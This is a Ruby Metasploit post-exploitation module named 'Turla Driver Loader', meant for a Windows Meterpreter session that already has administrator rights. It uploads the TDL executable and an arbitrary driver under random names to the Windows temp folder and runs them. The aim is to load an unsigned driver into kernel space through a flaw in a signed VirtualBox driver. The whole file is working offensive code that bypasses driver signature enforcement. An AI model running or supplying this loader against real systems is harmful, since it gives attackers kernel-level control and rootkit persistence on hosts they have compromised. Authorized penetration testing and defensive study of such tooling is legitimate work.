##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  include Msf::Post::Windows::Priv
  include Msf::Post::File

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'Turla Driver Loader',
      'Description'   => %q{
          This module uses the Turla Driver Loader to inject an arbitrary driver into
          kernel space on a target by way of a vulnerability in a signed Oracle VirtualBox 
          driver.  As it contains copyrighted material, the tool itself must be obtained and 
          installed by the end user of this module.

          See https://github.com/hfiref0x/TDL for details.
      },
      'License'       => MSF_LICENSE,
      'Author'        =>
        [
          'hfiref0x',                                    # Turla Driver Loader
          'William Webb <william_webb[at]rapid7.com>'    # Metasploit module
        ],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ]
    ))

    register_options([
      OptString.new('DRIVER', [false,'Driver file to install']),
      OptPath.new('TDL', [false,'Path to Turla Driver Loader',])
    ])

  end

  def upload_files(file, rfilename, directory="c:\\windows\\temp\\")
    begin
      print_status("Target #{directory + rfilename} being uploaded..")
      write_file(directory + rfilename, file)
    rescue Rex::Post::Meterpreter::RequestError => e
      fail_with(Failure::Unknown, "Error uploading file #{directory + rfilename}: #{e.class} #{e}")
    end
  end

  def run

    if datastore['DRIVER'].to_s.length > 0
      print_status("Using driver file #{datastore['DRIVER']}")
      driver_local = File.open(datastore['DRIVER'])
    else
      driver_local = File.open(File.join(Msf::Config.local_directory, "tdl", "driver.sys"))
    end

    if datastore['TDL'].to_s.length > 0
      print_status("Using TDL executable #{datastore['TDL']}")
      tdl_local = File.open(datastore['TDL'])
    else
      tdl_local = File.open(File.join(Msf::Config.local_directory, "tdl", "Furutaka.exe"))
    end
 
    unless ((is_admin?) && session.platform.include?("windows"))
      fail_with(Failure::None, 'Insufficient privileges or unsupported operating system')
    end

    
    hfile = tdl_local.read
    tdl_rfile = Rex::Text.rand_text_alpha_lower(8) + ".exe"
    tdl_local.close

    
    hdrv = driver_local.read
    driver_rfile = Rex::Text.rand_text_alpha_lower(8) + ".sys"
    driver_local.close

    print_status("Uploading Turla driver loader ...")
    upload_files(hfile, tdl_rfile)

    print_status("Uploading driver ....")
    upload_files(hdrv, driver_rfile)

    print_status("Executing TDL ...")

    cmd_exec("cmd.exe /C start c:\\windows\\temp\\#{tdl_rfile} c:\\windows\\temp\\#{driver_rfile} & pause", nil, 5)
  end

end
